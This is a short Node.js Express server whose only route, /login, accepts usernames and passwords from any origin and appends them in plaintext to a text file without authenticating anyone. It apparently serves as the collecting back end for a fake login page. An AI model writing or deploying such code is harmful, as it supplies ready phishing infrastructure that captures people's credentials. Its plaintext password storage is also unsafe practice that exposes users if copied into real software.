const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

app.post("/login", (req, res) => {
    const { username, password } = req.body;
    
    const logData = `Username: ${username}, Password: ${password}\n`;

    // Save login info to a text file
    fs.appendFile("logins.txt", logData, (err) => {
        if (err) {
            console.error("Error saving login:", err);
            return res.status(500).json({ message: "Failed to save login data" });
        }
        res.json({ message: "Login data saved successfully!" });
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
